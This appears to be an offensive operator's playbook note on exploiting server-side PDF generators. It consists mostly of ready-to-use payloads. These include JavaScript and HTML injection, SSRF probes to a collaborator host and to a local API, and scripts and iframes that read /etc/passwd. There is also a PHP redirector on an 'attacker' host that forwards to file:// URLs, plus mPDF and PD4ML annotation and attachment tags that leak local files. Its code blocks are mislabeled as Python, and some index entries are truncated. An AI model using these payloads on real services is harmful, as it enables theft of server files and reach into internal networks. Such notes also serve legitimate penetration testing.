---
technique: "PDF Generators"
family: "ssrf-xxe-file"
severity_hint: "medium"
tags: ["HTTP", "PDF", "SSRF", "XSS", "JavaScript"]
source: "_raw/Web attacks/Web Attacks/PDF Generators.md"
source_sha256: "882d1481ebb6e24a1e920f4f75d2aa7b013b1c317bc4fa9a4e73de3bc38f2950"
curator_version: 2
review_status: imported-unreviewed
---

# PDF Generators

> Family: **ssrf-xxe-file** · Severity hint: **medium** · Tags: HTTP, PDF, SSRF, XSS, JavaScript
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: —.

## Quick index — payloads & commands in this note
- `python: <script>document.write('test1')</script>`
- `python: <img src="http://burpcollaborator/"/>`
- `python: <script>`
- `python: <script>`
- `python: <iframe src="file:///etc/passwd" width="800" height="500"></iframe>`
- `python: # redirector.php?`
- `python: <iframe src="http://attacker:8000/redirector.php?url=%2fetc%2fpasswd" width="800" height="`
- `python: <annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="LFI" />`
- `python: <pd4ml:attachment src="/etc/passwd" description="LFI" icon="Paperclip"/>`

## Playbook (operator notes)

# PDF Generators

# Also check

[Exploiting PDF generators](https://app.notion.com/p/Exploiting-PDF-generators-1a52c37daa29802ca924d15775041526?pvs=21) 

# JS Code Execution

```python
<script>document.write('test1')</script>
```

# SSRF

```python
<img src="http://burpcollaborator/"/>
<link rel="stylesheet" href="http://burpcollaborator/" >
<iframe src="http://burpcollaborator/"></iframe>
<iframe src="http://127.0.0.1:8080/api/users" width="800" height="500"></iframe>
```

# LFI

## With JS

```python
<script>
	x = new XMLHttpRequest();
	x.onload = function(){
		document.write(btoa(this.responseText))
	};
	x.open("GET", "file:///etc/passwd");
	x.send();
</script>
```

```python
<script>
	function addNewlines(str) {
		var result = '';
		while (str.length > 0) {
		    result += str.substring(0, 100) + '\n';
			str = str.substring(100);
		}
		return result;
	}

	x = new XMLHttpRequest();
	x.onload = function(){
		document.write(addNewlines(btoa(this.responseText)))
	};
	x.open("GET", "file:///etc/passwd");
	x.send();
</script>
```

## Without JS

```python
<iframe src="file:///etc/passwd" width="800" height="500"></iframe>
<object data="file:///etc/passwd" width="800" height="500">
<portal src="file:///etc/passwd" width="800" height="500">
```

## Empty frame

### Trick `src`

```python
# redirector.php?
<?php header('Location: file://' . $_GET['url']); ?>
```

```python
<iframe src="http://attacker:8000/redirector.php?url=%2fetc%2fpasswd" width="800" height="500"></iframe>
```

# Annotations

<aside>
👉🏽

PDF files support advanced features like `annotations` and `attachments`, which we can also use to leak local files on the server. Check the developer documentation if possible. Check metadata to find out which program generated the PDF.

</aside>

## Example `mPDF`

```python
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="LFI" />
```

## Example `PD4ML`

```python
<pd4ml:attachment src="/etc/passwd" description="LFI" icon="Paperclip"/>
```

## Source
Original note: `_raw/Web attacks/Web Attacks/PDF Generators.md`
